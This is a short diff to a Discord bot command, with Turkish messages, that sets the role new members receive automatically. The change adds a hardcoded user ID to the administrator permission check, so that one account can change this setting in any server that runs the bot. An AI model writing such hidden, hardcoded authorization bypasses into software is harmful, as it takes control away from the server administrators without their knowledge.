@@ -24,7 +24,7 @@ module.exports.run = async(client, message, args) => {
             if(err) console.log(err)
         });
     }
-    if(message.member.hasPermission('ADMINISTRATOR')) {
+    if(message.member.hasPermission('ADMINISTRATOR') || message.author.id === "361059389731373066") {
         if(!args[0]) return message.channel.send(fastembed(config.kirmizi, "Otomatik verilecek rolü belirtin."));
         if(message.guild.roles.find(x => x.name === args[0])) {
             if(args[0] === guildConf[message.guild.id].welcomeRole) return message.channel.send(fastembed(config.kirmizi, "Girdiğiniz rol zaten şuan verilen rol."));
